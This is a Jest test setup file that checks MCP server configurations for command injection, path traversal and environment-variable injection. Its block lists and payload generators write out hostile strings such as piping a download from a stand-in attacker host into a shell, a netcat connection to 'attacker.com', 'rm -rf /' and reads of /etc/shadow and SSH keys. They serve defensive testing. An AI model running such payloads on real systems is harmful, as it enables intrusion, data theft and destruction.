/**
 * Security Test Setup - Enhanced security testing utilities
 * Focuses on command injection, file access, and privilege escalation prevention
 */

import { jest } from '@jest/globals';
import fs from 'fs/promises';
import path from 'path';
import os from 'os';

// Security test configuration
global.SECURITY_CONFIG = {
  restrictedPaths: [
    '/etc',
    '/root',
    '/usr/bin',
    '/System',
    'C:\\Windows',
    'C:\\Program Files'
  ],
  dangerousCommands: [
    'rm -rf /',
    'del /f /s /q',
    'format',
    'sudo',
    'su',
    'chmod 777',
    'curl | sh',
    'wget | sh',
    'eval',
    'exec'
  ],
  maliciousPayloads: [
    // Command injection attempts
    'node server.js; rm -rf /',
    'node server.js && curl evil.com/script.sh | sh',
    'node server.js || cat /etc/passwd',
    'node server.js | nc attacker.com 4444',

    // Path traversal attempts
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',

    // Code injection attempts
    'require("child_process").exec("rm -rf /")',
    '$(rm -rf /)',
    '`rm -rf /`',

    // Environment variable injection
    'NODE_ENV=production; rm -rf /',
    'PATH=/tmp:$PATH node malicious.js'
  ]
};

// Security utilities
global.securityUtils = {
  /**
   * Test command injection vulnerability
   */
  testCommandInjection: {
    /**
     * Generate malicious command strings
     */
    generateMaliciousCommands() {
      return [
        'node server.js; echo "INJECTED"',
        'node server.js && whoami',
        'node server.js || id',
        'node server.js | cat /etc/passwd',
        'node server.js & echo "BACKGROUND"',
        'node $(echo "malicious.js")',
        'node `echo "malicious.js"`',
        'node server.js; $(curl evil.com/script)',
        'node server.js; `curl evil.com/script`',
        "node server.js; eval('console.log(\"injected\")')"
      ];
    },

    /**
     * Generate malicious arguments
     */
    generateMaliciousArgs() {
      return [
        ['server.js', '; echo "INJECTED"'],
        ['server.js', '&& whoami'],
        ['server.js', '|| id'],
        ['server.js', '| cat /etc/passwd'],
        ['$(echo "malicious.js")'],
        ['`echo "malicious.js"`'],
        ['--eval', 'require("child_process").exec("echo INJECTED")'],
        ['--config', '../../../etc/passwd'],
        ['--output', '/etc/shadow']
      ];
    }
  },

  /**
   * Test path traversal vulnerability
   */
  testPathTraversal: {
    /**
     * Generate path traversal attempts
     */
    generateTraversalPaths() {
      return [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\hosts',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5chosts',
        '....//....//....//etc/passwd',
        '....\\\\....\\\\....\\\\windows\\\\system32\\\\hosts',
        '/etc/passwd%00.txt',
        '\\\\etc\\\\passwd%00.txt'
      ];
    },

    /**
     * Generate malicious file paths for configuration
     */
    generateMaliciousFilePaths() {
      return [
        '/etc/shadow',
        '/root/.ssh/id_rsa',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Users\\Administrator\\.ssh\\id_rsa',
        '/dev/null',
        '/dev/zero',
        'CON', // Windows reserved name
        'PRN', // Windows reserved name
        'NUL'  // Windows reserved name
      ];
    }
  },

  /**
   * Test environment variable injection
   */
  testEnvInjection: {
    /**
     * Generate malicious environment variables
     */
    generateMaliciousEnv() {
      return [
        { PATH: '/tmp:$PATH' },
        { LD_PRELOAD: '/tmp/malicious.so' },
        { NODE_OPTIONS: '--inspect=0.0.0.0:9229' },
        { NODE_OPTIONS: '--eval "require(\'child_process\').exec(\'whoami\')"' },
        { HOME: '/etc' },
        { SHELL: '/bin/sh -c "whoami"' },
        { EDITOR: 'vim -c ":!whoami"' },
        { PAGER: 'sh -c "whoami"' }
      ];
    }
  },

  /**
   * Validate that a configuration is safe
   */
  validateConfigSafety(config) {
    const issues = [];

    if (!config || typeof config !== 'object') {
      issues.push('Invalid configuration object');
      return { safe: false, issues };
    }

    if (config.mcpServers) {
      Object.entries(config.mcpServers).forEach(([name, server]) => {
        // Check command safety
        if (server.command) {
          global.SECURITY_CONFIG.dangerousCommands.forEach(dangerous => {
            if (server.command.includes(dangerous)) {
              issues.push(`Dangerous command detected in ${name}: ${dangerous}`);
            }
          });

          // Check for command injection patterns
          if (/[;&|`$(){}]/.test(server.command)) {
            issues.push(`Potential command injection in ${name}: ${server.command}`);
          }
        }

        // Check arguments safety
        if (server.args && Array.isArray(server.args)) {
          server.args.forEach((arg, index) => {
            if (typeof arg === 'string') {
              // Check for path traversal
              if (arg.includes('../') || arg.includes('..\\')) {
                issues.push(`Path traversal attempt in ${name} arg ${index}: ${arg}`);
              }

              // Check for command injection in arguments
              if (/[;&|`$()]/.test(arg)) {
                issues.push(`Potential command injection in ${name} arg ${index}: ${arg}`);
              }

              // Check for access to restricted paths
              global.SECURITY_CONFIG.restrictedPaths.forEach(restricted => {
                if (arg.startsWith(restricted)) {
                  issues.push(`Access to restricted path in ${name}: ${arg}`);
                }
              });
            }
          });
        }

        // Check environment variables
        if (server.env && typeof server.env === 'object') {
          Object.entries(server.env).forEach(([key, value]) => {
            if (typeof value === 'string') {
              // Check for injection in environment values
              if (/[;&|`$()]/.test(value)) {
                issues.push(`Potential injection in ${name} env ${key}: ${value}`);
              }
            }
          });
        }
      });
    }

    return {
      safe: issues.length === 0,
      issues
    };
  },

  /**
   * Create isolated test environment
   */
  async createSecureTestEnv() {
    const testDir = path.join(global.TEST_CONFIG.tempDir, 'security-test');
    await fs.mkdir(testDir, { recursive: true });

    // Create fake sensitive files for testing
    const fakePasswd = path.join(testDir, 'fake-passwd');
    await fs.writeFile(fakePasswd, 'root:x:0:0:root:/root:/bin/bash\n');

    const fakeShadow = path.join(testDir, 'fake-shadow');
    await fs.writeFile(fakeShadow, 'root:!:18000:0:99999:7:::\n');

    return {
      testDir,
      fakePasswd,
      fakeShadow,
      cleanup: async () => {
        try {
          await fs.rm(testDir, { recursive: true, force: true });
        } catch (error) {
          console.warn(`Failed to cleanup security test env: ${error.message}`);
        }
      }
    };
  },

  /**
   * Monitor system calls during test execution
   */
  createSystemCallMonitor() {
    const calls = {
      exec: [],
      spawn: [],
      access: [],
      open: [],
      readFile: [],
      writeFile: []
    };

    const originalExec = require('child_process').exec;
    const originalSpawn = require('child_process').spawn;

    // Mock dangerous system calls
    jest.spyOn(require('child_process'), 'exec').mockImplementation((command, options, callback) => {
      calls.exec.push({ command, options, timestamp: Date.now() });

      // Don't actually execute dangerous commands
      if (global.SECURITY_CONFIG.dangerousCommands.some(dangerous =>
          command.includes(dangerous))) {
        const error = new Error('Blocked dangerous command execution');
        if (callback) callback(error);
        return;
      }

      // For safe commands, call original
      return originalExec(command, options, callback);
    });

    jest.spyOn(require('child_process'), 'spawn').mockImplementation((command, args, options) => {
      calls.spawn.push({ command, args, options, timestamp: Date.now() });

      // Block dangerous spawns
      const fullCommand = `${command} ${(args || []).join(' ')}`;
      if (global.SECURITY_CONFIG.dangerousCommands.some(dangerous =>
          fullCommand.includes(dangerous))) {
        throw new Error('Blocked dangerous command spawn');
      }

      return originalSpawn(command, args, options);
    });

    return {
      calls,
      getCalls: () => calls,
      reset: () => {
        Object.keys(calls).forEach(key => {
          calls[key] = [];
        });
      }
    };
  }
};

// Security test assertions
global.expectSecurity = {
  /**
   * Expect configuration to be secure
   */
  toBeSecure(config) {
    const validation = global.securityUtils.validateConfigSafety(config);
    expect(validation.safe).toBe(true);
    if (!validation.safe) {
      throw new Error(`Security issues found: ${validation.issues.join(', ')}`);
    }
  },

  /**
   * Expect no dangerous system calls
   */
  toCauseNoDangerousCalls(systemCallMonitor) {
    const { calls } = systemCallMonitor.getCalls();

    const dangerousCalls = [
      ...calls.exec.filter(call =>
        global.SECURITY_CONFIG.dangerousCommands.some(dangerous =>
          call.command.includes(dangerous))),
      ...calls.spawn.filter(call => {
        const fullCommand = `${call.command} ${(call.args || []).join(' ')}`;
        return global.SECURITY_CONFIG.dangerousCommands.some(dangerous =>
          fullCommand.includes(dangerous));
      })
    ];

    expect(dangerousCalls).toHaveLength(0);
  },

  /**
   * Expect no access to restricted paths
   */
  toNotAccessRestrictedPaths(systemCallMonitor) {
    const { calls } = systemCallMonitor.getCalls();

    const restrictedAccess = [
      ...calls.access.filter(call =>
        global.SECURITY_CONFIG.restrictedPaths.some(restricted =>
          call.path && call.path.startsWith(restricted))),
      ...calls.open.filter(call =>
        global.SECURITY_CONFIG.restrictedPaths.some(restricted =>
          call.path && call.path.startsWith(restricted)))
    ];

    expect(restrictedAccess).toHaveLength(0);
  }
};

// Setup security monitoring for each test
beforeEach(() => {
  global.securityMonitor = global.securityUtils.createSystemCallMonitor();
});

afterEach(() => {
  if (global.securityMonitor) {
    global.securityMonitor.reset();
  }
});